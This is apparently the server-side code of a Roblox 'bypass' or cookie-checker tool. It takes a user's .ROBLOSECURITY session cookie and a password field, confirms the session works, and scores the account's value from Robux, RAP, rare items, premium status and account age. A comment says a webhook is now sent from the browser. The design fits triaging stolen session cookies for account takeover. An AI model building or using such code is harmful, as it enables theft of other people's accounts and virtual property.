const fetch = require('node-fetch');

// Helper function to make Roblox API requests
async function robloxRequest(url, cookie = null, method = 'GET', body = null) {
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json'
    };
    
    if (cookie) {
        headers['Cookie'] = `.ROBLOSECURITY=${cookie}`;
    }
    
    const options = {
        method,
        headers
    };
    
    if (body) {
        headers['Content-Type'] = 'application/json';
        options.body = JSON.stringify(body);
    }
    
    const response = await fetch(url, options);
    return response.json();
}

// Validate cookie and get user info
async function validateCookie(cookie) {
    try {
        const userInfo = await robloxRequest('https://users.roblox.com/v1/users/authenticated', cookie);
        if (userInfo && userInfo.id) {
            return userInfo;
        }
        return null;
    } catch (error) {
        return null;
    }
}

// Calculate account score
function calculateAccountScore(userData) {
    let score = 0;
    
    if (userData.robux > 10000) score += 20;
    else if (userData.robux > 5000) score += 15;
    else if (userData.robux > 1000) score += 10;
    else if (userData.robux > 100) score += 5;
    
    if (userData.rap > 100000) score += 20;
    else if (userData.rap > 50000) score += 15;
    else if (userData.rap > 10000) score += 10;
    else if (userData.rap > 1000) score += 5;
    
    if (userData.isPremium) score += 10;
    
    if (userData.vcStatus === '✅ Enabled') score += 5;
    
    if (userData.headlessStatus === '✅ True') score += 15;
    
    if (userData.korbloxStatus === '✅ True') score += 10;
    
    const ageDays = parseInt(userData.accountAge);
    if (ageDays > 2000) score += 10;
    else if (ageDays > 1000) score += 7;
    else if (ageDays > 365) score += 5;
    else if (ageDays > 100) score += 3;
    
    const totalSocial = userData.friendsCount + userData.followersCount;
    if (totalSocial > 1000) score += 5;
    else if (totalSocial > 500) score += 3;
    else if (totalSocial > 100) score += 2;
    
    if (userData.totalGroupsOwned > 10) score += 5;
    else if (userData.totalGroupsOwned > 5) score += 3;
    else if (userData.totalGroupsOwned > 0) score += 1;
    
    return Math.min(score, 100);
}

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed' });
    }

    const { cookie, checkOnly, password } = req.body;

    if (!cookie) {
        return res.status(400).json({ success: false, error: 'Cookie is required' });
    }

    try {
        // Step 1: Validate cookie
        const userInfo = await validateCookie(cookie);
        
        if (!userInfo) {
            return res.status(400).json({ success: false, valid: false, error: 'Invalid or expired cookie' });
        }

        const userId = userInfo.id;
        const username = userInfo.name;
        const displayName = userInfo.displayName;

        // If checkOnly mode (for cookie checker page)
        if (checkOnly) {
            try {
                const [avatarRes, robuxRes, premiumRes, collectiblesRes] = await Promise.all([
                    fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`),
                    fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
                    }),
                    fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`),
                    fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100&sortOrder=Desc`)
                ]);

                const avatarData = await avatarRes.json();
                const robuxData = await robuxRes.json();
                const premiumData = await premiumRes.json();
                const collectiblesData = await collectiblesRes.json();

                const avatarUrl = avatarData.data?.[0]?.imageUrl || '';
                const robux = robuxData.robux || 0;
                
                // Calculate RAP
                let rap = 0;
                if (collectiblesData.data) {
                    collectiblesData.data.forEach(item => {
                        if (item.recentAveragePrice) {
                            rap += item.recentAveragePrice;
                        }
                    });
                }

                // Check for special items
                const hasHeadless = collectiblesData.data?.some(item => item.assetId === 31117192);
                const hasKorblox = collectiblesData.data?.some(item => item.assetId === 139607718);

                // Get account age
                const userDetailsRes = await fetch(`https://users.roblox.com/v1/users/${userId}`);
                const userDetails = await userDetailsRes.json();
                const created = new Date(userDetails.created);
                const now = new Date();
                const accountAgeDays = Math.floor((now - created) / (1000 * 60 * 60 * 24));

                return res.status(200).json({
                    success: true,
                    valid: true,
                    userId,
                    username,
                    displayName,
                    avatarUrl,
                    robux,
                    pendingRobux: 0,
                    rap,
                    accountAge: `${accountAgeDays} Days`,
                    pinEnabled: 'NO',
                    voiceChat: 'NO',
                    emailVerified: userDetails.hasVerifiedBadge ? 'YES' : 'NO',
                    headless: hasHeadless ? 'YES' : 'NO',
                    korblox: hasKorblox ? 'YES' : 'NO',
                    groupsOwned: 0,
                    credit: '$0'
                });
            } catch (error) {
                return res.status(200).json({
                    success: true,
                    valid: true,
                    userId,
                    username,
                    displayName,
                    avatarUrl: '',
                    robux: 0,
                    pendingRobux: 0,
                    rap: 0,
                    accountAge: '0 Days',
                    pinEnabled: 'NO',
                    voiceChat: 'NO',
                    emailVerified: 'NO',
                    headless: 'NO',
                    korblox: 'NO',
                    groupsOwned: 0,
                    credit: '$0'
                });
            }
        }

        // Full bypass mode - fetch all data
        const [
            avatarResponse,
            robuxResponse,
            premiumResponse,
            friendsResponse,
            followersResponse,
            collectiblesResponse,
            groupsResponse,
            userDetailsResponse
        ] = await Promise.all([
            fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`),
            fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            }),
            fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`),
            fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
            fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`),
            fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100&sortOrder=Desc`),
            fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`),
            fetch(`https://users.roblox.com/v1/users/${userId}`)
        ]);

        const avatarData = await avatarResponse.json();
        const robuxData = await robuxResponse.json();
        const premiumData = await premiumResponse.json();
        const friendsData = await friendsResponse.json();
        const followersData = await followersResponse.json();
        const collectiblesData = await collectiblesResponse.json();
        const groupsData = await groupsResponse.json();
        const userDetails = await userDetailsResponse.json();

        const avatarUrl = avatarData.data?.[0]?.imageUrl || '';
        const robux = robuxData.robux || 0;
        const isPremium = premiumData ? true : false;
        const friendsCount = friendsData.count || 0;
        const followersCount = followersData.count || 0;

        let rap = 0;
        if (collectiblesData.data) {
            collectiblesData.data.forEach(item => {
                if (item.recentAveragePrice) {
                    rap += item.recentAveragePrice;
                }
            });
        }

        const hasHeadless = collectiblesData.data?.some(item => item.assetId === 31117192);
        const hasKorblox = collectiblesData.data?.some(item => item.assetId === 139607718);

        const groupsOwned = groupsData.data?.filter(g => g.role.rank === 255).length || 0;

        const created = new Date(userDetails.created);
        const now = new Date();
        const accountAgeDays = Math.floor((now - created) / (1000 * 60 * 60 * 24));

        const userData = {
            userId,
            username,
            displayName,
            avatarUrl,
            robux,
            pendingRobux: 0,
            rap,
            summary: `${robux} R$ | ${rap} RAP`,
            pinStatus: '❌ Disabled',
            isPremium,
            vcStatus: '❌ Disabled',
            headlessStatus: hasHeadless ? '✅ True' : '❌ False',
            korbloxStatus: hasKorblox ? '✅ True' : '❌ False',
            accountAge: `${accountAgeDays} days`,
            friendsCount,
            followersCount,
            creditBalance: '0.00',
            creditRobux: '0',
            totalGroupsOwned: groupsOwned,
            totalGroupFunds: 0,
            totalPendingGroupFunds: 0,
            emailVerified: userDetails.hasVerifiedBadge ? '✅ Verified' : '❌ Not Verified',
            accountScore: 0
        };

        userData.accountScore = calculateAccountScore(userData);

        // Return success response to frontend (webhook is sent from browser now!)
        return res.status(200).json({
            success: true,
            userInfo: {
                userId,
                username,
                displayName,
                name: username,
                robux,
                rap,
                premium: isPremium ? '✅ True' : '❌ False',
                voiceChat: '❌ Disabled',
                accountScore: userData.accountScore
            },
            avatarUrl: userData.avatarUrl
        });

    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({ success: false, error: 'Internal server error' });
    }
};
